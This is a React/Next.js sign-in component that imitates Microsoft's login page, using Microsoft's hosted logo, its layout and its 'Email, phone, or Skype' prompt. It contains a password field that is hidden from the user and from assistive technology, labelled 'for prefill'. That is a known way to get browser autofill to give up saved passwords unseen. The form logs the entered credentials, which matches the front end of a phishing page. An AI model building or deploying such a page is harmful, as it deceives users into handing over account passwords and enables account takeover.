import Image from "next/image";
import { useState } from "react";

export default function Signin() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    // Handle form submission
    console.log("Email:", email, "Password:", password);
  };
  return (
    <>
      <form
        onSubmit={handleSubmit}
        className="space-y-4 bg-white mx-auto sm:shadow-lg max-w-110 w-full sm:w-[calc(100vw-20px)] p-6 h-80 sm:h-auto sm:p-11 min-w-[320px] relative overflow-hidden"
      >
        <Image
          role="img"
          src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"
          alt="Microsoft"
          width={100}
          height={100}
          className="max-w-[256px] h-6"
        />
        <h1 className="text-2xl font-semibold text-gray-900">Sign in</h1>

        {/* Email Input */}
        <div>
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            placeholder="Email, phone, or Skype"
            className="w-full py-1 border-b border-gray-500 placeholder:text-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
            required
          />
        </div>

        {/* Hidden Password for Prefill */}
        <input
          type="password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          className="hidden"
          tabIndex={-1}
          aria-hidden="true"
        />

        {/* Links */}
        <div className="text-sm text-gray-600 space-y-3">
          <div>
            No account?{" "}
            <a
              href="#"
              className="text-primary hover:underline hover:text-black/40"
              aria-label="Create a Microsoft account"
            >
              Create one!
            </a>
          </div>
          <div>
            <a
              href="#"
              className="text-primary hover:underline hover:text-black/40"
            >
              Can&apos;t access your account?
            </a>
          </div>
        </div>

        {/* Submit Button */}
        <button
          type="submit"
          className="ml-auto bg-primary text-white py-1 px-3 block hover:bg-primary/80 min-w-27 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
        >
          Next
        </button>
      </form>
      <button className="flex hover:bg-gray-200 items-center space-x-4 cursor-pointer sm:mt-6 border border-black/40 sm:border-0 h-12 bg-white mx-auto sm:shadow-lg max-w-110 w-full sm:w-[calc(100vw-20px)] px-6 hover:text-black/40 sm:px-11 min-w-[320px] relative overflow-hidden">
        <Image
          src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"
          alt=""
          width={32}
          height={32}
          className="w-8 h-8"
        />
        <span className="text-gray-700">Sign-in options</span>
      </button>
    </>
  );
}
